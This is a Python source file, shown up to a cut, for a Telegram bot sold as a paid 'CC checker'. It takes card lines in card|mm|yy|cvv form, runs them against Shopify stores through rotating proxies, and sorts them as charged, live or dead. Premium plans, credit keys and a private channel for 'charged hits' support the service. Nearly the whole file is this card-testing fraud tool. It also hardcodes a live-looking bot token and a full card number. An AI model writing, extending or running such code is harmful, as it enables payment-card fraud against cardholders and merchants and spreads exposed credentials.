import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
import string
import html
from datetime import datetime, timedelta

from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.client.default import DefaultBotProperties

# ========== CONFIGURATION ==========
CHECKER_API_URL = 'http://127.0.0.1:8080/shopify' 
BOT_TOKEN = '9093651998:AAEPi_izqdnDqgL3MRm7_iKSfcFxDASBrGI'
ADMIN_IDS = [5831292144]
PVT_CHANNEL_ID = -1003763847738

REQUIRED_CHATS = [
    {"link": "https://t.me/Veo3_free_Paid", "id": None},
    {"link": "https://t.me/who_is_me_1", "id": None},
]

PLANS = {
    "trial": {"days": 1, "credits": 10000, "price": "2$", "name": "🎁 TRIAL"},
    "bronze": {"days": 3, "credits": 20000, "price": "4$", "name": "🥉 BRONZE"},
    "silver": {"days": 7, "credits": 40000, "price": "8$", "name": "🥈 SILVER"},
    "gold": {"days": 14, "credits": 50000, "price": "12$", "name": "🥇 GOLD"},
    "platinum": {"days": 24, "credits": 100000, "price": "22$", "name": "💎 PLATINUM"},
}

PREMIUM_FILE = 'premium.json'
KEYS_FILE = 'keys.json'
CREDITS_FILE = 'credits.json'
CREDIT_KEYS_FILE = 'credit_keys.json'
SITES_FILE = 'sites.txt'
PROXY_FILE = 'proxy.txt'
BANNED_FILE = 'banned.txt'
GROUP_SETTINGS_FILE = 'group_settings.json'
USER_PROXIES_FILE = 'user_proxies.json'

SITE_FILTERS = {
    "all": {"name": "📋 All Sites", "min": 0, "max": 999999},
    "under5": {"name": "💰 Under $5", "min": 0, "max": 5},
    "under10": {"name": "💰 Under $10", "min": 0, "max": 10},
    "under15": {"name": "💰 Under $15", "min": 0, "max": 15},
    "under20": {"name": "💰 Under $20", "min": 0, "max": 20},
    "under30": {"name": "💰 Under $30", "min": 0, "max": 30},
}

# ========== INIT ==========
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()
active_sessions = {}
ACTIVE_FILTER = "all"

# ========== DATABASE LOGIC ==========
def load_json(filepath):
    if not os.path.exists(filepath): return {}
    try:
        with open(filepath, 'r', encoding='utf-8') as f: return json.load(f)
    except: return {}

def save_json(filepath, data):
    try:
        with open(filepath, 'w', encoding='utf-8') as f: json.dump(data, f, indent=4)
    except: pass

def get_user_credits(user_id): return load_json(CREDITS_FILE).get(str(user_id), 0)

def add_credits(user_id, amount):
    data = load_json(CREDITS_FILE)
    data[str(user_id)] = data.get(str(user_id), 0) + amount
    save_json(CREDITS_FILE, data)

def remove_credits(user_id, amount):
    data = load_json(CREDITS_FILE)
    data[str(user_id)] = max(0, data.get(str(user_id), 0) - amount)
    save_json(CREDITS_FILE, data)

def deduct_credit(user_id):
    data = load_json(CREDITS_FILE)
    current = data.get(str(user_id), 0)
    if current >= 1:
        data[str(user_id)] = current - 1
        save_json(CREDITS_FILE, data)
        return True, data[str(user_id)]
    return False, current

def is_premium(user_id):
    data = load_json(PREMIUM_FILE)
    user = data.get(str(user_id))
    if not user: return False
    if datetime.now() > datetime.fromisoformat(user['expiry']):
        del data[str(user_id)]
        save_json(PREMIUM_FILE, data)
        return False
    return True

def get_user_plan_name(user_id):
    data = load_json(PREMIUM_FILE).get(str(user_id), {})
    plan_key = data.get('plan_key', '')
    return PLANS.get(plan_key, {}).get('name', "CUSTOM")

def add_premium_user(user_id, plan_key, days, credits):
    data = load_json(PREMIUM_FILE)
    expiry = datetime.now() + timedelta(days=days)
    data[str(user_id)] = {'expiry': expiry.isoformat(), 'plan_key': plan_key, 'days': days, 'credits': credits, 'added_at': datetime.now().isoformat()}
    save_json(PREMIUM_FILE, data)
    add_credits(user_id, credits)

def load_keys(): return load_json(KEYS_FILE)
def save_keys(data): save_json(KEYS_FILE, data)

def generate_premium_key(plan_key, days, credits):
    key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
    keys_data = load_keys()
    keys_data[key] = {'type': 'premium', 'plan': plan_key, 'days': days, 'credits': credits, 'used': False, 'created_at': datetime.now().isoformat()}
    save_keys(keys_data)
    return key

def redeem_premium_key(key, user_id):
    keys_data = load_keys()
    if key not in keys_data: return False, "Invalid premium key"
    if keys_data[key]['used']: return False, "Key already used"
    if is_premium(user_id): return False, "You already have premium access"
    days, credits, plan_key = keys_data[key]['days'], keys_data[key]['credits'], keys_data[key]['plan']
    add_premium_user(user_id, plan_key, days, credits)
    keys_data[key]['used'] = True
    keys_data[key]['used_by'] = user_id
    keys_data[key]['used_at'] = datetime.now().isoformat()
    save_keys(keys_data)
    return True, f"Redeemed {PLANS.get(plan_key, {}).get('name', 'Custom')} plan! {days} days + {credits} credits!"

def load_credit_keys(): return load_json(CREDIT_KEYS_FILE)
def save_credit_keys(data): save_json(CREDIT_KEYS_FILE, data)

def generate_credit_key(amount):
    key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
    keys_data = load_credit_keys()
    keys_data[key] = {'credits': amount, 'used': False, 'created_at': datetime.now().isoformat()}
    save_credit_keys(keys_data)
    return key

def redeem_credit_key(key, user_id):
    keys_data = load_credit_keys()
    if key not in keys_data: return False, "Invalid credit key"
    if keys_data[key]['used']: return False, "Key already used"
    credits = keys_data[key]['credits']
    add_credits(user_id, credits)
    keys_data[key]['used'] = True
    keys_data[key]['used_by'] = user_id
    keys_data[key]['used_at'] = datetime.now().isoformat()
    save_credit_keys(keys_data)
    return True, credits

def is_admin(user_id): return user_id in ADMIN_IDS

def get_file_lines(filepath):
    if not os.path.exists(filepath): return []
    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
        return [line.strip() for line in f if line.strip()]

def is_banned(user_id): return str(user_id) in get_file_lines(BANNED_FILE)
def ban_user(user_id):
    with open(BANNED_FILE, 'a', encoding='utf-8') as f: f.write(f"{user_id}\n")
def unban_user(user_id):
    banned = get_file_lines(BANNED_FILE)
    if str(user_id) in banned:
        banned.remove(str(user_id))
        with open(BANNED_FILE, 'w', encoding='utf-8') as f:
            for uid in banned: f.write(f"{uid}\n")

def load_group_settings(): return load_json(GROUP_SETTINGS_FILE)
def save_group_settings(data): save_json(GROUP_SETTINGS_FILE, data)
def is_group_enabled(chat_id): return load_group_settings().get(str(chat_id), False)
def set_group_enabled(chat_id, enabled):
    settings = load_group_settings()
    settings[str(chat_id)] = enabled
    save_group_settings(settings)

def load_user_proxies(): return load_json(USER_PROXIES_FILE)
def save_user_proxies(data): save_json(USER_PROXIES_FILE, data)
def get_user_specific_proxies(user_id): return load_user_proxies().get(str(user_id), [])
def add_user_proxy(user_id, proxy):
    data = load_user_proxies()
    if str(user_id) not in data: data[str(user_id)] = []
    if proxy not in data[str(user_id)]:
        data[str(user_id)].append(proxy)
        save_user_proxies(data)
        return True
    return False
def remove_user_proxy(user_id, proxy):
    data = load_user_proxies()
    if str(user_id) in data and proxy in data[str(user_id)]:
        data[str(user_id)].remove(proxy)
        save_user_proxies(data)
        return True
    return False
def clear_user_proxies(user_id):
    data = load_user_proxies()
    if str(user_id) in data and data[str(user_id)]:
        data[str(user_id)] = []
        save_user_proxies(data)
        return True
    return False

def load_sites(): return get_file_lines(SITES_FILE)
def load_proxies(): return get_file_lines(PROXY_FILE)

def add_site(site):
    sites = load_sites()
    if site in sites: return False, "Site already exists"
    with open(SITES_FILE, 'a', encoding='utf-8') as f: f.write(f"{site}\n")
    return True, "Site added"

def add_sites_bulk(site_list):
    current = load_sites()
    added = [s for s in site_list if s not in current]
    if added:
        with open(SITES_FILE, 'a', encoding='utf-8') as f:
            for s in added: f.write(f"{s}\n")
    return added, len(site_list) - len(added)

def remove_site(site):
    sites = load_sites()
    if site not in sites: return False, "Site not found"
    with open(SITES_FILE, 'w', encoding='utf-8') as f:
        for s in sites:
            if s != site: f.write(f"{s}\n")
    return True, "Site removed"

def extract_cc(text):
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    return [f"{m[0]}|{m[1]}|{m[2] if len(m[2])==4 else '20'+m[2]}|{m[3]}" for m in matches]

async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as res:
                if res.status != 200: return '-', '-', '-', '-', '-', ''
                data = await res.json()
                return data.get('brand', '-'), data.get('type', '-'), data.get('level', '-'), data.get('bank', '-'), data.get('country_name', '-'), data.get('country_flag', '')
    except: return '-', '-', '-', '-', '-', ''

# ========== API CHECKER ==========
async def check_card(card, site, proxy):
    try:
        params = {'cc': card, 'site': site, 'proxy': proxy}
        timeout = aiohttp.ClientTimeout(total=120)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(CHECKER_API_URL, params=params) as resp:
                raw = await resp.json(content_type=None)
        msg = raw.get('Response', '')
        price = raw.get('Price', '-')
        gate = raw.get('Gate', 'Shopify')
        is_charged = any(k in msg.upper() for k in ["ORDER_PLACED", "CHARGE_SUCCESS", "ORDER COMPLETED"]) or "💎" in msg
        if is_charged: return {'status': 'Charged', 'message': msg, 'card': card, 'gateway': gate, 'price': price}
        elif any(k in msg.upper() for k in ["APPROVED", "INSUFFICIENT", "INVALID_CVC", "INCORRECT_CVC"]):
            return {'status': 'Approved', 'message': msg, 'card': card, 'gateway': gate, 'price': price}
        else: return {'status': 'Dead', 'message': msg, 'card': card, 'gateway': gate, 'price': price}
    except Exception as e:
        return {'status': 'Error', 'message': str(e), 'card': card, 'retry': True}

async def check_card_with_retry(card, sites, proxies, max_retries=2):
    if not sites: return {'status': 'Dead', 'message': 'No sites', 'card': card}
    if not proxies: return {'status': 'Dead', 'message': 'No proxies', 'card': card}
    for _ in range(max_retries):
        res = await check_card(card, random.choice(sites), random.choice(proxies))
        if not res.get('retry'): return res
        await asyncio.sleep(0.3)
    return {'status': 'Dead', 'message': 'Max retries', 'card': card}

# ========== UI HELPERS ==========
def format_hit_ui(card, status, response, gateway, price, bin_info, user_name, user_id, elapsed="0.0s"):
    if status == "Charged": title = "𝐏𝐚𝐲𝐦𝐞𝐧𝐭 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥 🔥"
    elif status == "Approved": title = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 𝐋𝐢𝐯𝐞 ✅"
    else: title = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
    
    bin_parts = bin_info.split('\n')
    bank_line = next((line for line in bin_parts if 'Bank:' in line), 'Bank: UNKNOWN')
    bin_line = next((line for line in bin_parts if 'BIN:' in line), 'BIN: UNKNOWN')
    country_line = next((line for line in bin_parts if 'Country:' in line), 'Country: UNKNOWN')
    
    msg = f"""<b>{title}</b>
<b>𝐒𝐡𝐨𝐩𝐢𝐟𝐲 𝐀𝐮𝐭𝐨 ➠</b> {price} (USD)
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
<b>CC ➠</b> <code>{card}</code>
<b>BANK ➠</b> {bank_line.replace('Bank: ', '')} - {bin_line.replace('BIN: ', '')} - {country_line.replace('Country: ', '')}
<b>BIN INFO ➠</b> {bin_line.replace('BIN: ', '')}
<b>RESPONSE ➠</b> <code>{html.escape(response[:100])}</code>
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
<b>𝐓𝐢𝐦𝐞 ➠</b> {elapsed} | <b>𝐁𝐲 ➠</b> <a href="tg://user?id={user_id}">{user_name}</a>"""
    return msg

async def send_realtime_hit_to_user(user_id, hit_type, card, response_msg, gateway, price):
    try:
        sender = await bot.get_chat(user_id)
        user_name = sender.first_name
    except: user_name = str(user_id)
    
    bin_info_raw = await get_bin_info(card.split('|')[0])
    bin_info_str = f"Bank: {bin_info_raw[3]}\nBIN: {bin_info_raw[0]} - {bin_info_raw[1]} - {bin_info_raw[2]}\nCountry: {bin_info_raw[4]} {bin_info_raw[5]}"
    
    msg = format_hit_ui(card, hit_type, response_msg, gateway, price, bin_info_str, user_name, user_id)
    try: await bot.send_message(user_id, msg, parse_mode="HTML")
    except: pass

async def send_log_to_channel(response_msg, gateway, price, username, user_id):
    plan = get_user_plan_name(user_id)
    msg = f"""<b>✅ CHARGED HIT</b>
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
<b>Response ➠</b> {html.escape(response_msg[:100])}
<b>Gateway ➠</b> {gateway} | <b>Price ➠</b> {price}
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
<b>User ➠</b> <a href='tg://user?id={user_id}'>{username or user_id}</a> ({plan} USER)"""
    try: await bot.send_message(PVT_CHANNEL_ID, msg, parse_mode="HTML")
    except: pass

# ========== INLINE KEYBOARDS ==========
def main_menu_keyboard(is_admin_user=False):
    builder = InlineKeyboardBuilder()
    builder.button(text="💳 CC Checker", callback_data="menu_cc")
    builder.button(text="🌐 Site & Proxy", callback_data="menu_net")
    builder.button(text="💎 Plans & Keys", callback_data="menu_plans")
    builder.button(text="👤 My Account", callback_data="menu_info")
    if is_admin_user:
        builder.button(text="🛠️ Admin Control Panel", callback_data="menu_admin")
    builder.button(text="📢 Official Channel", url="https://t.me/Veo3_free_Paid")
    builder.button(text="💬 Owner / Support", url="https://t.me/who_is_me_1")
    builder.adjust(2, 2, 1, 2)
    return builder.as_markup()

def back_keyboard():
    builder = InlineKeyboardBuilder()
    builder.button(text="🔙 Back to Main Menu", callback_data="menu_home")
    return builder.as_markup()

# ========== COMMANDS ==========
@dp.message(Command("start"))
async def start(event: Message):
    uid = event.from_user.id
    if is_banned(uid): return await event.reply("🚫 You are banned from using this bot.")
    
    missing_chats = []
    for chat in REQUIRED_CHATS:
        try:
            member = await bot.get_chat_member(chat["link"], uid)
            if member.status in ["left", "kicked"]: missing_chats.append(chat["link"])
        except: missing_chats.append(chat["link"])
    
    if missing_chats:
        builder = InlineKeyboardBuilder()
        for link in missing_chats: builder.button(text="📢 Join Channel", url=link)
        builder.button(text="✅ Joined", callback_data="check_joined")
        builder.adjust(1, 1, 1)
        return await event.reply("<b>⚠️ Access Denied!</b>\n\nYou must join the following channels first:\n\nThen click 'Joined' button.", reply_markup=builder.as_markup())

    is_prem = is_premium(uid)
    is_adm = is_admin(uid)
    credits = get_user_credits(uid)
    plan_name = get_user_plan_name(uid)
    
    if is_prem:
        premium_data = load_json(PREMIUM_FILE).get(str(uid), {})
        expiry = premium_data.get('expiry', 'Unknown')
        expiry_str = datetime.fromisoformat(expiry).strftime('%Y-%m-%d') if expiry != 'Unknown' else 'Unknown'
        status_text = "Active"
    else:
        expiry_str = "N/A"
        status_text = "Free"

    text = f"""<b>⚡ 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 𝐀𝐆𝐆𝐀 𝐂𝐇𝐊 𝐏𝐑𝐎 ⚡</b>
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
👤 <b>User ➠</b> <a href="tg://user?id={uid}">{event.from_user.first_name}</a> [<code>{uid}</code>]
💎 <b>Plan ➠</b> {plan_name} ({status_text})
💰 <b>Credits ➠</b> <code>{credits}</code>
📅 <b>Expires ➠</b> <code>{expiry_str}</code>
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
<i>Select a menu below to access commands & tools:</i>"""
    
    await event.reply(text, reply_markup=main_menu_keyboard(is_adm))

@dp.callback_query(F.data == "check_joined")
async def check_joined_callback(call: CallbackQuery):
    await call.answer("Verification Successful! Use /start again.", show_alert=True)

@dp.callback_query(F.data == "menu_home")
async def back_to_home(call: CallbackQuery):
    uid = call.from_user.id
    is_prem = is_premium(uid)
    is_adm = is_admin(uid)
    credits = get_user_credits(uid)
    plan_name = get_user_plan_name(uid)
    
    if is_prem:
        premium_data = load_json(PREMIUM_FILE).get(str(uid), {})
        expiry = premium_data.get('expiry', 'Unknown')
        expiry_str = datetime.fromisoformat(expiry).strftime('%Y-%m-%d') if expiry != 'Unknown' else 'Unknown'
        status_text = "Active"
    else:
        expiry_str = "N/A"
        status_text = "Free"

    text = f"""<b>⚡ 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 𝐀𝐆𝐆𝐀 𝐂𝐇𝐊 𝐏𝐑𝐎 ⚡</b>
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
👤 <b>User ➠</b> <a href="tg://user?id={uid}">{call.from_user.first_name}</a> [<code>{uid}</code>]
💎 <b>Plan ➠</b> {plan_name} ({status_text})
💰 <b>Credits ➠</b> <code>{credits}</code>
📅 <b>Expires ➠</b> <code>{expiry_str}</code>
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
<i>Select a menu below to access commands & tools:</i>"""
    
    await call.message.edit_text(text, reply_markup=main_menu_keyboard(is_adm))
    await call.answer()

@dp.callback_query(F.data == "menu_cc")
async def menu_cc(call: CallbackQuery):
    txt = "<b>💳 CC Checker Commands</b>\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
    txt += "<blockquote>/cc card|mm|yy|cvv - Check single card\n/chk - Reply to .txt file\n/multi card1 card2 ... - Check 10 cards at once</blockquote>"
    await call.message.edit_text(txt, reply_markup=back_keyboard())
    await call.answer()

@dp.callback_query(F.data == "menu_net")
async def menu_net(call: CallbackQuery):
    txt = "<b>🌐 Site & Proxy Commands</b>\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
    txt += "<blockquote>/site - Check sites\n/addsite site.com\n/proxy - Check proxies\n/addproxy</blockquote>"
    await call.message.edit_text(txt, reply_markup=back_keyboard())
    await call.answer()

@dp.callback_query(F.data == "menu_plans")
async def menu_plans(call: CallbackQuery):
    txt = "<b>💎 Premium Plans</b>\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
    for k, v in PLANS.items():
        txt += f"<b>{v['name']}</b> ➠ {v['days']} Days | {v['credits']} Credits | {v['price']}\n"
    txt += "\nUse /redeem KEY to activate.\nUse /redeemcredit KEY to add credits."
    await call.message.edit_text(txt, reply_markup=back_keyboard())
    await call.answer()

@dp.callback_query(F.data == "menu_info")
async def menu_info(call: CallbackQuery):
    uid = call.from_user.id
    credits = get_user_credits(uid)
    is_prem = is_premium(uid)
    plan_name = get_user_plan_name(uid)
    
    if is_prem:
        premium_data = load_json(PREMIUM_FILE).get(str(uid), {})
        expiry = premium_data.get('expiry', 'Unknown')
        expiry_str = datetime.fromisoformat(expiry).strftime('%Y-%m-%d %H:%M:%S') if expiry != 'Unknown' else 'Unknown'
        days_left = (datetime.fromisoformat(expiry) - datetime.now()).days if expiry != 'Unknown' else 0
        txt = f"<b>👤 Account Info</b>\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n<b>ID ➠</b> <code>{uid}</code>\n<b>Status ➠</b> PREMIUM\n<b>Plan ➠</b> {plan_name}\n<b>Credits ➠</b> {credits}\n<b>Expires ➠</b> {expiry_str}\n<b>Days Left ➠</b> {days_left} days"
    else:
        txt = f"<b>👤 Account Info</b>\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n<b>ID ➠</b> <code>{uid}</code>\n<b>Status ➠</b> FREE\n<b>Credits ➠</b> {credits}"
    await call.message.edit_text(txt, reply_markup=back_keyboard())
    await call.answer()

@dp.callback_query(F.data == "menu_admin")
async def menu_admin(call: CallbackQuery):
    txt = "<b>🛠️ Admin Control Panel</b>\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
    txt += "<blockquote>Command list for admins:\n/addpremium, /addpremiumcustom\n/genpremiumkey, /gencreditkey\n/addcredits, /removecredits\n/site, /addsite, /clearsite, /getsites\n/proxy, /addproxy, /clearproxy, /getproxy\n/ban, /unban, /stats</blockquote>"
    await call.message.edit_text(txt, reply_markup=back_keyboard())
    await call.answer()

# ========== SINGLE CC CHECK ==========
@dp.message(Command("cc"))
async def single_cc_check(event: Message):
    uid = event.from_user.id
    if is_banned(uid): return
    if not is_premium(uid) and not is_admin(uid): return await event.reply("❌ <b>Premium Required!</b>")
    if get_user_credits(uid) < 1: return await event.reply("❌ <b>Insufficient Credits!</b>")
    
    cards = extract_cc(event.text.replace('/cc', '', 1).strip())
    if not cards: return await event.reply("❌ <b>Invalid Format.</b> Use: <code>/cc card|mm|yy|cvv</code>")
    card = cards[0]
    
    status_msg = await event.reply(f"""<b>𝐒𝐡𝐨𝐩𝐢𝐟𝐲 𝐀𝐮𝐭𝐨 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 ⚡</b>
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
<b>CC ➠</b> <code>{card}</code>
<b>𝐒𝐭𝐚𝐭𝐮𝐬 ➠</b> ⏳ <i>Processing card...</i>
<b>𝐅𝐢𝐥𝐭𝐞𝐫 ➠</b> {SITE_FILTERS[ACTIVE_FILTER]['name']}
<b>𝐂𝐫𝐞𝐝𝐢𝐭𝐬 ➠</b> {get_user_credits(uid)}""")
    
    res = await check_card_with_retry(card, load_sites(), load_proxies())
    _, credits = deduct_credit(uid)
    b, t, l, bank, ctry, flag = await get_bin_info(card.split('|')[0])
    bin_info_str = f"Bank: {bank}\nBIN: {b} - {t} - {l}\nCountry: {ctry} {flag}"
    
    final_msg = format_hit_ui(card, res['status'], res['message'], res.get('gateway', '-'), res.get('price', '-'), bin_info_str, event.from_user.first_name, uid)
    final_msg += f"\n<b>💰 Credits Left ➠</b> {credits}"
    
    if res['status'] == 'Charged':
        await send_log_to_channel(res['message'], res.get('gateway', '-'), res.get('price', '-'), event.from_user.username, uid)
        
    await status_msg.edit_text(final_msg)

# ========== MASS CHECK ==========
@dp.message(Command("chk"))
async def check_command(event: Message):
    uid = event.from_user.id
    if is_banned(uid) or (not is_premium(uid) and not is_admin(uid)): return
    if not event.reply_to_message: return await event.reply("📌 Reply to a .txt file.")
    
    reply = event.reply_to_message
    if not reply.document or not reply.document.file_name.endswith('.txt'): return await event.reply("❌ Invalid file.")
    
    status = await event.reply("<b>Processing your file...</b>")
    file_path = await bot.download(reply.document)
    
    async with aiofiles.open(file_path.name, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()
    os.remove(file_path.name)
    
    cards = extract_cc(content)
    if not cards: return await status.edit_text("❌ No cards found.")
    if get_user_credits(uid) < len(cards): return await status.edit_text(f"❌ Need {len(cards)} credits.")
    
    key = f"{uid}_{status.message_id}"
    active_sessions[key] = {'paused': False}
    res = {'charged': [], 'approved': [], 'dead': [], 'total': len(cards), 'checked': 0, 'start': time.time()}
    
    queue = asyncio.Queue()
    for c in cards: queue.put_nowait(c)
    
    async def worker():
        while not queue.empty() and key in active_sessions:
            while active_sessions.get(key, {}).get('paused', False): await asyncio.sleep(1)
            try: c = queue.get_nowait()
            except: break
            r = await check_card_with_retry(c, load_sites(), load_proxies())
            res['checked'] += 1
            deduct_credit(uid)
            
            if r['status'] == 'Charged':
                res['charged'].append(r)
                await send_log_to_channel(r['message'], r.get('gateway', '-'), r.get('price', '-'), event.from_user.username, uid)
            elif r['status'] == 'Approved': res['approved'].append(r)
            else: res['dead'].append(r)
            
            if res['checked'] % 5 == 0:
                elapsed = int(time.time() - res['start'])
                prog = f"""<b>𝐒𝐡𝐨𝐩𝐢𝐟𝐲 𝐌𝐚𝐬𝐬 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 ⚡</b>
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
<b>𝐏𝐫𝐨𝐠𝐫𝐞𝐬𝐬 ➠</b> <code>{res['checked']}/{res['total']}</code>
<b>𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥 ➠</b> <code>{len(res['charged'])}</code>
<b>𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅ ➠</b> <code>{len(res['approved'])}</code>
<b>𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌ ➠</b> <code>{len(res['dead'])}</code>
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
<b>𝐓𝐢𝐦𝐞 ➠</b> {elapsed}s | <b>𝐂𝐫𝐞𝐝𝐢𝐭𝐬 ➠</b> <code>{get_user_credits(uid)}</code>"""
                try: await status.edit_text(prog, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⏸️ Pause", callback_data="pause"), InlineKeyboardButton(text="▶️ Resume", callback_data="resume"), InlineKeyboardButton(text="🛑 Stop", callback_data="stop")]]))
                except: pass

    await asyncio.gather(*[worker() for _ in range(10)])
    if key in active_sessions: del active_sessions[key]
    await status.delete()
    
    final = f"<b>𝐌𝐚𝐬𝐬 𝐂𝐡𝐞𝐜𝐤 𝐂𝐨𝐦𝐩𝐥𝐞𝐭𝐞𝐝</b>\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n✅ {len(res['charged'])} | 🔥 {len(res['approved'])} | ❌ {len(res['dead'])}"
    if res['charged']: final += "\n\n<b>CHARGED:</b>\n" + "\n".join([f"<code>{x['card']}</code>" for x in res['charged'][:5]])
    if res['approved']: final += "\n\n<b>LIVE:</b>\n" + "\n".join([f"<code>{x['card']}</code>" for x in res['approved'][:5]])
    await event.reply(final)

@dp.callback_query(F.data == "pause")
async def pause_session(call: CallbackQuery):
    k = f"{call.from_user.id}_{call.message.message_id}"
    if k in active_sessions: active_sessions[k]['paused'] = True; await call.answer("Paused")
    await call.answer()

@dp.callback_query(F.data == "resume")
async def resume_session(call: CallbackQuery):
    k = f"{call.from_user.id}_{call.message.message_id}"
    if k in active_sessions: active_sessions[k]['paused'] = False; await call.answer("Resumed")
    await call.answer()

@dp.callback_query(F.data == "stop")
async def stop_session(call: CallbackQuery):
    k = f"{call.from_user.id}_{call.message.message_id}"
    if k in active_sessions: del active_sessions[k]; await call.answer("Stopped")
    await call.answer()

# ========== ADMIN COMMANDS ==========
@dp.message(Command("addpremium"))
async def add_premium(event: Message):
    if not is_admin(event.from_user.id): return
    args = event.text.split()
    if len(args) != 3: return await event.reply("❌ Usage: /addpremium user_id plan")
    try:
        uid, plan = int(args[1]), args[2].lower()
        if plan not in PLANS: return await event.reply("❌ Invalid plan.")
        p = PLANS[plan]
        add_premium_user(uid, plan, p['days'], p['credits'])
        await event.reply(f"✅ Added {p['name']} to {uid}")
        try: await bot.send_message(uid, f"🎉 Premium Activated! Plan: {p['name']}")
        except: pass
    except: await event.reply("❌ Invalid ID.")

@dp.message(Command("addpremiumcustom"))
async def add_premium_custom(event: Message):
    if not is_admin(event.from_user.id): return
    args = event.text.split()
    if len(args) != 4: return await event.reply("❌ Usage: /addpremiumcustom user_id days credits")
    try:
        uid, days, credits = int(args[1]), int(args[2]), int(args[3])
        add_premium_user(uid, "custom", days, credits)
        await event.reply(f"✅ Added Custom Premium: {days} Days + {credits} Credits to {uid}")
        try: await bot.send_message(uid, f"🎉 Premium Activated! {days} Days + {credits} Credits")
        except: pass
    except: await event.reply("❌ Invalid format.")

@dp.message(Command("genpremiumkey"))
async def gen_key(event: Message):
    if not is_admin(event.from_user.id): return
    args = event.text.split()
    if len(args) < 3: return await event.reply("❌ Usage: /genpremiumkey amount plan")
    try:
        amt = int(args[1]); plan = args[2].lower()
        if plan not in PLANS: return await event.reply("❌ Invalid plan.")
        p = PLANS[plan]
        keys = [generate_premium_key(plan, p['days'], p['credits']) for _ in range(amt)]
        keys_txt = "\n".join([f"• <code>{k}</code>" for k in keys])
        await event.reply(f"✅ Generated {amt} keys:\n{keys_txt}")
    except: await event.reply("❌ Error.")

@dp.message(Command("gencreditkey"))
async def gen_credit_key_admin(event: Message):
    if not is_admin(event.from_user.id): return
    args = event.text.split()
    if len(args) != 3: return await event.reply("❌ Usage: /gencreditkey amount credits")
    try:
        amt = int(args[1]); credits = int(args[2])
        keys = [generate_credit_key(credits) for _ in range(amt)]
        keys_txt = "\n".join([f"• <code>{k}</code>" for k in keys])
        await event.reply(f"✅ Generated {amt} credit keys:\n{keys_txt}")
    except: await event.reply("❌ Error.")

@dp.message(Command("addcredits"))
async def add_credits_admin(event: Message):
    if not is_admin(event.from_user.id): return
    args = event.text.split()
    if len(args) != 3: return await event.reply("❌ Usage: /addcredits user_id amount")
    try:
        uid, amount = int(args[1]), int(args[2])
        add_credits(uid, amount)
        await event.reply(f"✅ Added {amount} credits to {uid}. Total: {get_user_credits(uid)}")
    except: await event.reply("❌ Invalid format.")

@dp.message(Command("removecredits"))
async def remove_credits_admin(event: Message):
    if not is_admin(event.from_user.id): return
    args = event.text.split()
    if len(args) != 3: return await event.reply("❌ Usage: /removecredits user_id amount")
    try:
        uid, amount = int(args[1]), int(args[2])
        remove_credits(uid, amount)
        await event.reply(f"✅ Removed {amount} credits from {uid}. Total: {get_user_credits(uid)}")
    except: await event.reply("❌ Invalid format.")

@dp.message(Command("site"))
async def site_check(event: Message):
    if not is_admin(event.from_user.id): return
    sites, proxies = load_sites(), load_proxies()
    if not sites or not proxies: return await event.reply("❌ Missing sites/proxies.")
    msg = await event.reply("<b>Checking Sites...</b>")
    alive, dead = [], []
    for s in sites:
        res = await check_card("5154623245618097|03|2032|156", s, random.choice(proxies))
        if res['status'] == 'Error' or 'TIMEOUT' in res['message'].upper(): dead.append(s)
        else: alive.append(s)
    with open(SITES_FILE, 'w') as f:
        for s in alive: f.write(f"{s}\n")
    await msg.edit_text(f"✅ Sites: {len(alive)} alive, {len(dead)} dead removed.")

@dp.message(Command("addsite"))
async def add_site_cmd(event: Message):
    if not is_admin(event.from_user.id): return
